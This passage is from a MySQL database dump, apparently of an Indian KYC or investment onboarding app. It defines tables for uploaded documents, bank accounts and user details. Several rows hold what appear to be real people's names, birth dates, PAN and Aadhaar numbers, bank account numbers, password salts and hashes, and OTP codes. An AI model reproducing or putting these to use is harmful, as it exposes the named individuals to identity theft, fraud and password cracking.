) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_upload_doc_category`
--

INSERT INTO `tbl_upload_doc_category` (`id`, `parent_cat_id`, `cat_name`) VALUES
(1, 0, 'Cancelled Cheque'),
(2, 0, 'Income Proof'),
(3, 0, 'Signature Copy'),
(4, 0, 'Pan Card'),
(5, 0, 'Address Proof'),
(7, 1, 'Cancelled Cheque'),
(8, 2, 'Bank Statement of Last 3 Months'),
(9, 2, 'ITR of the last financial year'),
(10, 2, 'Salary Slip of last 6 months'),
(11, 3, 'Signature'),
(12, 4, 'Pancard'),
(13, 5, 'Aadhaar Card Front'),
(14, 5, 'Aadhaar Card Back');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_upload_doc_cat_desc`
--

CREATE TABLE `tbl_upload_doc_cat_desc` (
  `id` int(10) NOT NULL COMMENT 'Autro Increment ID',
  `sub_cat_id` int(10) NOT NULL COMMENT 'Parent  Category ID',
  `cat_desc` text NOT NULL COMMENT 'Category Description'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_upload_doc_cat_desc`
--

INSERT INTO `tbl_upload_doc_cat_desc` (`id`, `sub_cat_id`, `cat_desc`) VALUES
(1, 7, 'Full Name printed on cheque'),
(2, 7, 'IFSC Code on cheque'),
(3, 7, 'Account Number printed on cheque'),
(4, 8, 'A/C Number and IFSC should be mentioned\r\n'),
(5, 8, 'Name should be mentioned\r\n'),
(6, 8, 'Avg balance >10,000 Rs\r\n'),
(7, 9, 'Name should match with account holder\r\n'),
(8, 9, 'Should be latest statement Returns submitted should be mentioned\r\n'),
(9, 10, 'Name should match with account holder\r\n'),
(10, 10, 'Regular salary credits should be mentioned\r\n'),
(11, 11, 'Signature should match with that of Pan card\r\n'),
(12, 11, 'Please sign on a blank plain white paper\r\n');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_useraccountdetails`
--

CREATE TABLE `tbl_useraccountdetails` (
  `useraccountdetailsid` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `accountnumber` varchar(30) NOT NULL,
  `accounttype` enum('1','2','3') NOT NULL DEFAULT '1',
  `ifsccode` varchar(30) NOT NULL,
  `micr_no` varchar(30) NOT NULL,
  `bankname` varchar(250) NOT NULL,
  `bankaddress` text,
  `bankaddress1` varchar(36) NOT NULL,
  `bankaddress2` varchar(36) NOT NULL,
  `bankaddress3` varchar(36) NOT NULL,
  `city` varchar(255) NOT NULL,
  `pincode` int(6) NOT NULL,
  `stateid` int(11) NOT NULL,
  `state_name` text NOT NULL COMMENT 'Bank State Name',
  `is_bank_api` enum('0','1') NOT NULL DEFAULT '0' COMMENT 'Bank Details from Api: 1=Yes, 0=No',
  `created_on` date NOT NULL COMMENT 'Date of Creation'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_useraccountdetails`
--

INSERT INTO `tbl_useraccountdetails` (`useraccountdetailsid`, `user_id`, `accountnumber`, `accounttype`, `ifsccode`, `micr_no`, `bankname`, `bankaddress`, `bankaddress1`, `bankaddress2`, `bankaddress3`, `city`, `pincode`, `stateid`, `state_name`, `is_bank_api`, `created_on`) VALUES
(2, 175, '1111111', '1', 'sbin0007026', '700002148', 'STATE BANK OF INDIA', 'P 1  TARATALA ROAD  DISTT  24 PARGANAS SOUTH WEST BENGAL  700088', '', '', '', 'KOLKATA', 0, 0, 'WEST BENGAL', '1', '2017-05-15'),
(3, 177, '20176333858', '1', 'SBIN0000519', '462002011', 'STATE BANK OF INDIA', 'H.E.T. BHOPAL, PIPLANI BHOPAL, MADHYA PRADESH, PIN 462021', '', '', '', 'BHOPAL', 0, 0, 'MADHYA PRADESH', '1', '2017-05-17'),
(4, 186, '201001419611', '1', 'SBIN0030003', '462005002', 'STATE BANK OF INDIA', '113,MARWARI ROAD', '', '', '', 'BHOPAL', 0, 0, 'MADHYA PRADESH', '1', '2017-06-02'),
(5, 187, '201001419610', '1', 'sbin0030003', '462005002', 'STATE BANK OF INDIA', '113,MARWARI ROAD', '', '', '', 'BHOPAL', 0, 0, 'MADHYA PRADESH', '1', '2017-06-02'),
(6, 189, '20111456789', '1', 'SBIN0030003', '462005002', 'STATE BANK OF INDIA', '113,MARWARI ROAD', '', '', '', 'BHOPAL', 0, 0, 'MADHYA PRADESH', '1', '2017-06-02'),
(7, 190, '2015245256852', '1', 'hdfc0003662', '462240009', 'HDFC BANK', 'HDFC BANK LTD 52 53 NEW MARKET TT NAGAR OPP SBI BHOPAL MADHYA PRADESH 462003', '', '', '', 'BHOPAL', 0, 0, 'MADHYA PRADESH', '1', '2017-06-02'),
(8, 192, '2014568524582', '1', 'SBIN0030003', '462005002', 'STATE BANK OF INDIA', '113,MARWARI ROAD', '', '', '', 'BHOPAL', 0, 0, 'MADHYA PRADESH', '1', '2017-06-02'),
(9, 193, '2015256852452', '1', 'SBIN0030003', '462005002', 'STATE BANK OF INDIA', '113,MARWARI ROAD', '', '', '', 'BHOPAL', 0, 0, 'MADHYA PRADESH', '1', '2017-06-03'),
(10, 200, '201004196525', '1', 'sbin0030003', '462005002', 'STATE BANK OF INDIA', '113,MARWARI ROAD', '', '', '', 'BHOPAL', 0, 0, 'MADHYA PRADESH', '1', '2017-06-09'),
(11, 201, '201456852685', '1', 'SBIN0030003', '462005002', 'STATE BANK OF INDIA', '113,MARWARI ROAD', '', '', '', 'BHOPAL', 0, 0, 'MADHYA PRADESH', '1', '2017-06-10'),
(12, 216, '201456826', '1', 'sbin0030002', '456123789', 'sbi', 'KOTRA SULTANABAD', '', '', '', 'bhopal', 0, 0, 'mp', '0', '0000-00-00'),
(13, 227, '20100419611', '1', 'SBIN0030003', '462005002', 'STATE BANK OF INDIA', '113,MARWARI ROAD', '', '', '', 'BHOPAL', 0, 0, 'MADHYA PRADESH', '1', '2017-07-11'),
(14, 229, '2014562582', '1', 'SBIN0030003', '462005002', 'STATE BANK OF INDIA', '113,MARWARI ROAD', '', '', '', 'BHOPAL', 0, 0, 'MADHYA PRADESH', '1', '2017-07-11'),
(15, 239, '20100419610', '1', 'SBIN0030003', '462005002', 'STATE BANK OF INDIA', '113,MARWARI ROAD', '', '', '', 'BHOPAL', 0, 0, 'MADHYA PRADESH', '1', '2017-07-12'),
(16, 241, '50100184160491', '1', 'HDFC0000036', '452240002', 'HDFC BANK', 'UG-1&2,TRADE HOUSESOUTH TUKOGANJINDOREMADHYA PRADESH452 001', '', '', '', 'INDORE', 0, 0, 'MADHYA PRADESH', '1', '2017-07-12'),
(17, 244, '20176333858', '1', 'SBIN0000519', '462002011', 'STATE BANK OF INDIA', 'H.E.T. BHOPAL, PIPLANI BHOPAL, MADHYA PRADESH, PIN 462021', '', '', '', 'BHOPAL', 0, 0, 'MADHYA PRADESH', '1', '2017-07-12'),
(18, 252, '20100419610', '1', 'SBIN0030003', '462005002', 'STATE BANK OF INDIA', '113,MARWARI ROAD', '', '', '', 'BHOPAL', 0, 0, 'MADHYA PRADESH', '1', '2017-07-12'),
(19, 258, '20148526', '1', 'sbin0030003', '462005002', 'STATE BANK OF INDIA', '113,MARWARI ROAD', '', '', '', 'BHOPAL', 0, 0, 'MADHYA PRADESH', '1', '2018-05-29'),
(20, 259, '00251050015045', '1', 'HDFC0000025', 'NA', 'HDFC BANK', 'RELIANCE TS, PO: CHOWKLODHIVALI VILLAGE,TALUKA KOLHAPUR, RAIGAD PATALGANGA MAHARASHTRA 410206', '', '', '', 'LODHIVALI', 0, 0, 'MAHARASHTRA', '1', '2017-07-12'),
(21, 254, '50100184160491', '1', 'HDFC0000036', '452240002', 'HDFC BANK', 'UG-1&2,TRADE HOUSESOUTH TUKOGANJINDOREMADHYA PRADESH452 001', '', '', '', 'INDORE', 0, 0, 'MADHYA PRADESH', '1', '2017-07-12'),
(22, 251, '07648100000004', '1', 'BARB0JAYANA', '', 'BANK OF BARODA', '9TH MAIN 3RD BLOCK JAYANAGAR', '', '', '', 'BANGALORE', 0, 0, 'KARNATAKA', '0', '0000-00-00'),
(23, 273, '06831140029167', '1', 'HDFC0000683', '695240004', 'HDFC BANK', 'PADMANABHAM, CLUB HOUSE ROAD,TECHNOPARK,KARIAVATTOM POKAZHAKKOOTA', '', '', '', 'THIRUVANANTHAPURAM', 0, 0, 'KERALA', '1', '2017-07-12'),
(2463, 4504, '123456789', '1', 'Sbin0030003', '462005002', 'STATE BANK OF INDIA', '113,MARWARI ROAD', '', '', '', 'BHOPAL', 0, 0, 'MADHYA PRADESH', '1', '2018-06-06'),
(2464, 4499, '2892001500008713', '1', 'punb0289200', '452024008', 'PUNJAB NATIONAL BANK', 'MPHB SHOPPING COMPLEX,AB ROAD', '', '', '', 'INDORE', 0, 0, 'MADHYA PRADESH', '1', '2018-06-06'),
(2465, 4508, '33664000217', '1', 'SBIN0015270', 'NA', 'STATE BANK OF INDIA', 'PRANDARPUR KANDI BRANCH,VILL AND POST PURANDARPUR,PS KANDI,DISTT.MURSHIDABAD.WEST BENGAL 742171', '', '', '', 'KANDI', 0, 0, 'WEST BENGAL', '1', '2018-06-06'),
(2466, 4508, '33664000217', '1', 'SBIN0015270', 'NA', 'STATE BANK OF INDIA', 'PRANDARPUR KANDI BRANCH,VILL AND POST PURANDARPUR,PS KANDI,DISTT.MURSHIDABAD.WEST BENGAL 742171', '', '', '', 'KANDI', 0, 0, 'WEST BENGAL', '1', '2018-06-06'),
(2467, 4508, '33664000217', '1', 'SBIN0015270', 'NA', 'STATE BANK OF INDIA', 'PRANDARPUR KANDI BRANCH,VILL AND POST PURANDARPUR,PS KANDI,DISTT.MURSHIDABAD.WEST BENGAL 742171', '', '', '', 'KANDI', 0, 0, 'WEST BENGAL', '1', '2018-06-06');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_userdetails`
--

CREATE TABLE `tbl_userdetails` (
  `id` int(11) NOT NULL,
  `fname` varchar(200) DEFAULT NULL,
  `mname` varchar(200) DEFAULT NULL,
  `lname` varchar(200) DEFAULT NULL,
  `pass_salt` varchar(250) NOT NULL COMMENT 'Password Salt',
  `pass_hash` varchar(250) NOT NULL COMMENT 'Password Hash',
  `fathername` varchar(200) NOT NULL COMMENT 'Spouse''s Name also store here',
  `father_fname` varchar(50) NOT NULL,
  `father_mname` varchar(50) NOT NULL,
  `father_lname` varchar(50) NOT NULL,
  `mother_name` varchar(150) NOT NULL,
  `mother_fname` varchar(50) NOT NULL,
  `mother_mname` varchar(50) NOT NULL,
  `mother_lname` varchar(50) NOT NULL,
  `sex` enum('1','2','3') NOT NULL DEFAULT '1' COMMENT '1=Male,2=Female,3=other',
  `nationality` varchar(50) NOT NULL,
  `dob` date NOT NULL,
  `pancard` varchar(200) NOT NULL,
  `addharcard` varchar(200) NOT NULL,
  `nonAadharNorPanNo` varchar(20) NOT NULL,
  `validity` date NOT NULL,
  `annualincome` enum('0','1','2','3','4','5') NOT NULL DEFAULT '1' COMMENT '1for below_1L,2 for 1L_to_5L,3for 5L_to_10L,4for 10L_to_25L,5for above_25L ',
  `gs_amt` varchar(30) NOT NULL COMMENT 'Net Amount',
  `occupationid` int(11) NOT NULL,
  `otpcode` varchar(255) NOT NULL,
  `isotpvalid` enum('0','1') NOT NULL DEFAULT '0' COMMENT '0 for no and 1 for yes',
  `userResidentialstatus` enum('0','1','2','3') NOT NULL DEFAULT '0' COMMENT '0 for Resident Individual and 1 for Non Resident and 2 for Foreign National and 3 for Person of Indian Origin',
  `marital_status` enum('0','1','2') NOT NULL DEFAULT '0' COMMENT '0=unmarried, 1 = married, 2 = divorced',
  `user_code` varchar(30) NOT NULL COMMENT 'User Unique Code',
  `active_from` date NOT NULL COMMENT 'User Active from',
  `inactive_from` date NOT NULL COMMENT 'User Inactive from',
  `base_64Image` text NOT NULL COMMENT 'Base 64 Image Src',
  `reg_status` enum('0','1','2','3','4','5') NOT NULL DEFAULT '0' COMMENT '0=default, 1=verified,2=form fillup offline, 3=payment pending, 4=done,5=payment fail',
  `is_aadhaar_api` enum('0','1') NOT NULL DEFAULT '0',
  `is_super_admin` int(10) NOT NULL DEFAULT '0',
  `status` enum('0','1') NOT NULL DEFAULT '1' COMMENT 'shows 1=active and 0=inactive',
  `process_status` int(11) NOT NULL DEFAULT '0',
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_userdetails`
--

INSERT INTO `tbl_userdetails` (`id`, `fname`, `mname`, `lname`, `pass_salt`, `pass_hash`, `fathername`, `father_fname`, `father_mname`, `father_lname`, `mother_name`, `mother_fname`, `mother_mname`, `mother_lname`, `sex`, `nationality`, `dob`, `pancard`, `addharcard`, `nonAadharNorPanNo`, `validity`, `annualincome`, `gs_amt`, `occupationid`, `otpcode`, `isotpvalid`, `userResidentialstatus`, `marital_status`, `user_code`, `active_from`, `inactive_from`, `base_64Image`, `reg_status`, `is_aadhaar_api`, `is_super_admin`, `status`, `process_status`, `created_at`) VALUES
(1, 'BRAJENDRA SINGH BHATI', '', 'Admin', 'y7l0ces8zi28vbwch02rzwawv2xzka8x0srplexdp5443aisv83hj2hx3tytvvxi', '067e506ee2d6d97447828b862b42b6aa027cda13008e7eeed53911f49edbe8ef79fce374f07719793edab8d46f33eed3961f5514b429be574cf335aa7347c110', 'T Paul', 'CHANDRA SINGH BHATI', '', '', '', '', '', '', '1', 'Indian', '1976-09-12', 'amjpb3638c', '', '', '0000-00-00', '2', '', 3, '', '0', '0', '0', '', '2016-10-19', '0000-00-00', '', '1', '0', 1, '1', 0, NULL),
(195, NULL, NULL, NULL, 'nyrnv9x5cowvtztp5p6oixezozmisg1xebpzz6c3s8lfen33h5c4e3vdhe95d9gd', '098e8a85ffad19d7a7f5c2338e8cc5ce51e467f26ec4bcbc319827d41cfdec3dce34b313974e7737821515ceb5203b547f7ea14d22dc3c4cdd079b833ec0dfd9', '', '', '', '', '', '', '', '', '1', '', '0000-00-00', '', '', '', '0000-00-00', '1', '', 0, '497283', '0', '0', '0', '', '0000-00-00', '0000-00-00', '', '0', '0', 0, '1', 0, '2017-06-09 18:55:35'),
(196, NULL, NULL, NULL, '5folfwmujg15t3qwad6w1n7ss97xgiqd51e390hfbqib8bg7ou0y77urwqej9pvc', 'a8d4d8d767787a159fc7757dd1db423a3b48bb34c8744cab5c2608278c02a0c1866664ecd40867e2608d78439ccceee430caf3328527a8cef03ce4e02bba30c8', '', '', '', '', '', '', '', '', '1', '', '0000-00-00', '', '', '', '0000-00-00', '1', '', 0, '629703', '0', '0', '0', '', '0000-00-00', '0000-00-00', '', '0', '0', 0, '1', 0, '2017-06-09 18:55:46'),
(197, NULL, NULL, NULL, '3nyvi86nhphza1iau1e0ld4et3tkwdorqhcrxn99rqcdfs5nv6t27nasha9fpv89', '0621c489622de42f613fdc065c07524026580f1337ae6110e20fd1acbb089d2d34d9d15eabc807234f8f2614ba256ec781d96e98570afd631c0dbeb8c2a62779', '', '', '', '', '', '', '', '', '1', '', '0000-00-00', '', '', '', '0000-00-00', '1', '', 0, '896754', '0', '0', '0', '', '0000-00-00', '0000-00-00', '', '0', '0', 0, '1', 0, '2017-06-09 18:56:02'),
(198, NULL, NULL, NULL, 'tp4jb3w9e104l2act2ftj32g1v8y32yyn0h2q5cun85og0rufs6dgwerfzzdfk7s', 'b782c488e92724bec5e0d1fab18cff9253b0b00b872a695fedc7d3a65b84d557489595a0bc8f31bf71fd7cab7895d029e598541b148cb3f4317ba7cea205a9df', '', '', '', '', '', '', '', '', '1', '', '0000-00-00', '', '', '', '0000-00-00', '1', '', 0, '942370', '0', '0', '0', '', '0000-00-00', '0000-00-00', '', '0', '0', 0, '1', 0, '2017-06-09 18:57:29'),
(199, NULL, NULL, NULL, 'mnhpuopl66vg023avy2i367dab3nfoo1l2jkwxhxellr79g3tzuvs3jz8ijqolfv', '5e0a7a79f34363fa56ef83274c870b953e2b88df6e71bd275e9c9a6faf008b688c3c68e45d711b30d11764ddf3732b424541c1f5dab4acdd82b16ee588b8d84b', '', '', '', '', '', '', '', '', '1', '', '0000-00-00', '', '', '', '0000-00-00', '1', '', 0, '457180', '0', '0', '0', '', '0000-00-00', '0000-00-00', '', '0', '0', 0, '1', 0, '2017-06-09 18:59:29'),
(202, NULL, NULL, NULL, '7uro8lcezc0ccj81ju0smmfxcye6tpd2kc8d7vy1haeznlpverw3dinbhnxeujhi', '9d41b907d393d00beec1eb08c0ff09e5b8f9ac14112082cfb4fc8e71dc9ac7f16c0809239f5a249a3ec5a4fc76093d6ca4db87d9217c8843ceebdaf0e07b8339', '', '', '', '', '', '', '', '', '1', '', '0000-00-00', '', '', '', '0000-00-00', '1', '', 0, '618397', '0', '0', '0', '', '0000-00-00', '0000-00-00', '', '0', '0', 0, '1', 0, '2017-06-13 11:02:05'),
(203, NULL, NULL, NULL, '2f4a8cnffki2y4ei15miktonhybgjf4ids4ekzmkuzb4tp3bryu9mcn42xtu2zh8', '449ae63354e20c1e49a3726883f8242f81eb78ef1a6c8a3d76a9e34ecc8fa90791bf7b4f57f237d0284f4c5d83aee9efbfdd66e72017838b40efc159a8923b6c', '', '', '', '', '', '', '', '', '1', '', '0000-00-00', '', '', '', '0000-00-00', '1', '', 0, '937056', '0', '0', '0', '', '0000-00-00', '0000-00-00', '', '0', '0', 0, '1', 0, '2017-06-13 11:02:25'),
(204, NULL, NULL, NULL, '1jxnc654ksko3ovbctrhjtlz5hyidee6g5po9rqt32iltikt18a8z6coywqoxm5i', 'f3f836a344c0244798f29cb6f291931ea4f5c66a81e0cdda2354fbd794545aca794d152dcf7cbcfa7490192b69b0c03067c62c2ce88e3f8255059dcbb775beea', '', '', '', '', '', '', '', '', '1', '', '0000-00-00', '', '', '', '0000-00-00', '1', '', 0, '907514', '0', '0', '0', '', '0000-00-00', '0000-00-00', '', '0', '0', 0, '1', 0, '2017-06-13 11:03:23'),
(205, NULL, NULL, NULL, 'sxdvlyxa41i3r1g8dbjhkmt6dfc93m5fjvw0t50ijkiuqxtzgpc15q9lsy4jp18q', '7bdaf337016527e92eadc46f8b636db4222924977426db9c898e2cd169517e788ec43cdd0e8f227e655aab15a4d24617dbb9442330f2902e01e0eb0ac24b2f49', '', '', '', '', '', '', '', '', '1', '', '0000-00-00', '', '', '', '0000-00-00', '1', '', 0, '081362', '0', '0', '0', '', '0000-00-00', '0000-00-00', '', '0', '0', 0, '1', 0, '2017-06-13 11:03:25'),
(206, NULL, NULL, NULL, 'jlb1i5xufiqmct1h5n72ag7k2znpg2ll63jz2e6mwo1k6bdxl1vn3t473c58k102', '60e9513c5ca0dd7f5ce2bfa330c5e3af94a21ed8b89c4877e7de155a17c894630373b84f0602b601e411c8baf1d7f95f59dc617c28e68cf13e72a9602f43ba6c', '', '', '', '', '', '', '', '', '1', '', '0000-00-00', '', '', '', '0000-00-00', '1', '', 0, '807563', '0', '0', '0', '', '0000-00-00', '0000-00-00', '', '0', '0', 0, '1', 0, '2017-06-13 15:56:17'),
(207, NULL, NULL, NULL, 'vomaiv2mpid5bwaa8v0396bfwj8b4q3tsb57e7pwdtiadxsh0yo4uaadkbs12aab', '99047300625bb71e3bead8075e79cfdba395ad2b6a515653e6a1ca9298eb09ffae32faebb4c0842c05da2f206188e9dddd322172f76fea50823d296e0e7a23a3', '', '', '', '', '', '', '', '', '1', '', '0000-00-00', '', '', '', '0000-00-00', '1', '', 0, '084219', '0', '0', '0', '', '0000-00-00', '0000-00-00', '', '0', '0', 0, '1', 0, '2017-06-13 15:58:59'),
(208, NULL, NULL, NULL, 'zk1ifrhkj75invo6jzt7ytjsn6qh9ll2idm0q74o9s78zs90pue2grzcnfzit296', 'ab6c066790c681285c5b1961f6ceae4e8e67b09dc78c1d2c040b86a481c4200355cc0b2a30bd790722b38bbd47f1ecae48425938ff5de88ebe8fa27ef2b9998d', '', '', '', '', '', '', '', '', '1', '', '0000-00-00', '', '', '', '0000-00-00', '1', '', 0, '', '1', '0', '0', '', '0000-00-00', '0000-00-00', '', '1', '0', 0, '1', 0, '2017-06-13 16:07:13'),
(209, NULL, NULL, NULL, 'pw5t79u2tbi1ak3x8gn2u5dvuqa066clphxu0xdo4nv7s2ve8c54katg8xscc30s', '8d7353e5b722923b4e777042a151e513d7c978b8a166714bfcac4fb48f5601ea36fdcda9534a4f93b15105b394ccd36488d724c3143b4c1abd5c43e6884ca04e', '', '', '', '', '', '', '', '', '1', '', '0000-00-00', '', '', '', '0000-00-00', '1', '', 0, '876091', '0', '0', '0', '', '0000-00-00', '0000-00-00', '', '0', '0', 0, '1', 0, '2017-06-13 16:10:56'),
(210, NULL, NULL, NULL, '5o29dsxxcqwrng4vz3a0zm5yj2mejrxin7na3qcs2d3ofj5qmr3itnuu2h26h5p6', '31adf82654bd8b807d9f8d80a6c097ace34f6c411f5398ceb47955a1a64a502984570d6810e2dc966b43ab967dadb725aa0c70c55a4f29f9e701f259a90cec95', '', '', '', '', '', '', '', '', '1', '', '0000-00-00', '', '', '', '0000-00-00', '1', '', 0, '904815', '0', '0', '0', '', '0000-00-00', '0000-00-00', '', '0', '0', 0, '1', 0, '2017-06-13 16:11:00'),
(211, NULL, NULL, NULL, 'waeym8bolk57o8a2s9x08qvppte5yo7s9siuie6wkz31bbqqxit0fg4uzhdfpy8k', '9f6411125a83c33042f456a45eb8c527342518ce882e317fa4929d4929b9ee85eeadb51801ef046d9d06f83b8af5f7cce52f347196f224e798116ea5172a86f4', '', '', '', '', '', '', '', '', '1', '', '0000-00-00', '', '', '', '0000-00-00', '1', '', 0, '632105', '0', '0', '0', '', '0000-00-00', '0000-00-00', '', '0', '0', 0, '1', 0, '2017-06-13 16:11:08'),
(212, NULL, NULL, NULL, 'kee7n8q8nppym7zf86ci74nymv7rsz4dvvm3nf4xycy65iknarctovx9sz8ljo2c', 'bcb82d1709c419cc90336faabaa2c3b99d1b800167f7be7b9b9bba388eb53d70ab0392d4ff03a6d68dc7b8594a6b2581635def91e45f6227ef6adabaf1d48d94', '', '', '', '', '', '', '', '', '1', '', '0000-00-00', '', '', '', '0000-00-00', '1', '', 0, '097154', '0', '0', '0', '', '0000-00-00', '0000-00-00', '', '0', '0', 0, '1', 0, '2017-06-13 16:12:07'),
(213, NULL, NULL, NULL, '84mfsve4a7ll7jfoxtepldy03bikakqcldqjox7oqd26k45mkoayobxmibk9kze9', 'f98a71b0afa5d658e9d5dbf2a534753fbc5de0bbba44bc4163d736fa8ebaba2c7bdc3914354eddd76bce21a6433b02e57954a25d972ccb5e2dec17d437c92e94', '', '', '', '', '', '', '', '', '1', '', '0000-00-00', '', '', '', '0000-00-00', '1', '', 0, '146920', '0', '0', '0', '', '0000-00-00', '0000-00-00', '', '0', '0', 0, '1', 0, '2017-06-13 16:13:27'),
(214, NULL, NULL, NULL, '2f8tge7d70owejyycidt4z6ajan7vdvbwjeigushejo4sxiix2m246ftdb5xm3hc', 'db1d1f2a3f3478d47db94a6d1c26cc5e6b298b1d3814eb26ec0a0dd88977535931c15099ec3119c2fb2688463811141244094b2c201384abfcc209454aa812e4', '', '', '', '', '', '', '', '', '1', '', '0000-00-00', '', '', '', '0000-00-00', '1', '', 0, '514780', '0', '0', '0', '', '0000-00-00', '0000-00-00', '', '0', '0', 0, '1', 0, '2017-06-13 16:13:28'),
(215, NULL, NULL, NULL, 'c3ig3ue1khzpvc7wdjgl1cc03gbmp5tv6acx57bj8gxd8sgiw712z9lsfrhjg3bd', 'eeb9098862c3a500d5ca8f9cf12b5814874cc6249d311a821fc991900d1917ad6ffe57c964be72aa8abfc390ef7878da229837d05db79020af54ef7091a8e4e7', '', '', '', '', '', '', '', '', '1', '', '0000-00-00', '', '', '', '0000-00-00', '1', '', 0, '870243', '0', '0', '0', '', '0000-00-00', '0000-00-00', '', '0', '0', 0, '1', 0, '2017-06-13 16:13:30'),
(217, NULL, NULL, NULL, 'za6qn27bid685m5k9j4q0ju4bwzgtc5i0wss3tmjoq26gqs0v1e2zid66rwpn50c', '68970947ce03d00eb82a84d42d10949c75879f01702533f55aba196e2ca20907b57fad1b17f21650150bb619dd8d678473c10da3e2237100a9feaad09c45fab0', '', '', '', '', '', '', '', '', '1', '', '0000-00-00', '', '', '', '0000-00-00', '1', '', 0, '465273', '0', '0', '0', '', '0000-00-00', '0000-00-00', '', '0', '0', 0, '1', 0, '2017-07-03 18:17:14'),
(218, NULL, NULL, NULL, '411dcrdeydo3o3eqghxe0j36opg9z5px1b395vqf9o8jxyxrreyqho2xndk9aqg4', 'f9d1535f06a3aa75033a0917b2c59f31f0d71cdf7440ef19baa7ffb20cce6d1349ecf96806d904c7bcaa12fa6690eb38a26a32d7ef8d7d8101f667178c31ab2d', '', '', '', '', '', '', '', '', '1', '', '0000-00-00', '', '', '', '0000-00-00', '1', '', 0, '891240', '0', '0', '0', '', '0000-00-00', '0000-00-00', '', '0', '0', 0, '1', 0, '2017-07-03 18:17:21'),
(219, NULL, NULL, NULL, 'crjjbsjnenzz0awwlg8hxqtqs2te2xx2d2ra71u8cdb4cgf0s20dpdyvwtf81mu3', '3a2b9d26f0a2ba0d3e6bfff6720155e5c080c834e1deea6d86c4209b56ad267d29f5e7515655775f66b26bea7fe02f892649a9786093fde42175d65f1739c11c', '', '', '', '', '', '', '', '', '1', '', '0000-00-00', '', '', '', '0000-00-00', '1', '', 0, '970352', '0', '0', '0', '', '0000-00-00', '0000-00-00', '', '0', '0', 0, '1', 0, '2017-07-03 18:18:48'),
(220, NULL, NULL, NULL, 'd9jdq9btr3pjc8ft6aueugjwikz2nt8a1vwqih9qajcu0rjh155gjwdtpk44q4tr', '09eba156778062538d70463cecfa8d4b127d42d6ac727ffa797b0c3927441ba7cce11b90f82602fdf40ba5df78fda591e9b5b9213b5d4a22f37e9d6c99a4f149', '', '', '', '', '', '', '', '', '1', '', '0000-00-00', '', '', '', '0000-00-00', '1', '', 0, '', '1', '0', '0', '', '0000-00-00', '0000-00-00', '', '1', '0', 0, '1', 0, '2017-07-03 18:22:50'),
(221, NULL, NULL, NULL, 'v5r9qlr18va6tnqfhot10x70ub1duxz4uis918ziwjvajgs61x5uz0s4sylyku4k', 'ba71f318ca8fca566eefec4061828ca49837e6a2025fa6b3e2bd6dfb64c1f1dccff731a2f6a13916ca6d1bdff582987195f39a9447077651492e071487aae6c7', '', '', '', '', '', '', '', '', '1', '', '0000-00-00', '', '', '', '0000-00-00', '1', '', 0, '487139', '0', '0', '0', '', '0000-00-00', '0000-00-00', '', '0', '0', 0, '1', 0, '2017-07-03 18:31:51'),
(4506, 'Deepak  Gaur', NULL, NULL, 'j0yuyx2kahwnu8ka2p5doflkgh6wtfnpkjfglu021oxms0odnu5cnln9xs3bzvy7', 'a0e8c94d2bb50ecdeef99e21ce611a5d8a2273286ca05949f1661ef0f42e782aa98bfc221ee871189fef525bc5f5fab51db1f33065a990071f0b79ca4109eea7', '', 'Mathura  Prasad  Gaur', '', '', 'Priya Mishra', 'Priya Mishra', '', '', '1', 'Indian', '1993-06-08', 'bcrpg3881r', '882456415649', '', '0000-00-00', '2', '', 2, '', '1', '0', '2', '', '0000-00-00', '0000-00-00', '', '1', '0', 0, '1', 6, '2018-06-06 05:30:28'),
(4507, 'Deepak  Gaur', NULL, NULL, 'n0strg6g7wwp2l2cp7iy4pryln3v7m6ktpwamlqchhy3tn0a94tcm7pbc0co3u5p', '6b5060a9aeb73ba9e1d4bcb04276367a1d7c8be249db3a84cf7a8b0844afe6b1d9432b7f39a733ddffa1aa704ee391e1bb15ff44bdca98fea0e38e94b4453752', '', 'Mathura  Prasad  Gaur', '', '', 'Priya Mishra', 'Priya Mishra', '', '', '1', 'Indian', '1993-06-08', 'bcrpg3881r', '823566482555', '', '0000-00-00', '1', '', 2, '', '1', '0', '2', '', '0000-00-00', '0000-00-00', '', '1', '0', 0, '1', 6, '2018-06-06 05:57:40'),
(4508, 'SOURAV GHOSH HAZRA', NULL, NULL, 'rbwvdycetv6d2bhrspdj3hegr4inqclsnonh20bfqj382wog1g3je0b852fpmrds', 'db60a6fafd09d286f7bdad20736633c55d6a54612792b2041eb5c22a042279faf87b3e80379fafc4fe1a203ec207e3e6663e96306051f35e3dfc41fa030e5a43', '', 'PARTHA GHOSH HAZRA', '', '', 'MITALI GHOSH HAZRA', 'MITALI GHOSH HAZRA', '', '', '1', 'Indian', '1996-03-01', 'ALCPH7453B', '739248373733', '', '0000-00-00', '1', '', 9, '', '1', '0', '2', '', '0000-00-00', '0000-00-00', '', '4', '0', 0, '1', 6, '2018-06-06 07:06:50');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_user_address`
--

CREATE TABLE `tbl_user_address` (
  `id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `address1` varchar(36) NOT NULL,
  `address2` varchar(36) NOT NULL,
  `address3` varchar(36) DEFAULT NULL,
  `address4` varchar(36) NOT NULL,
  `pincode` varchar(10) NOT NULL,
  `state_id` int(11) NOT NULL DEFAULT '0',
  `state_name` varchar(100) NOT NULL COMMENT 'State Name',
  `country_id` int(11) NOT NULL DEFAULT '0',
  `country_name` varchar(100) NOT NULL COMMENT 'Contry Name',
  `address_proof_id` int(11) NOT NULL DEFAULT '0',
  `address_proof_no` varchar(30) NOT NULL,
  `address_proof_id_validity` date NOT NULL,
  `is_permanent_address` enum('0','1') NOT NULL DEFAULT '0' COMMENT '0 for no and 1 for yes',
  `created_on` date NOT NULL COMMENT 'Date of Creation '
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_user_address`
--

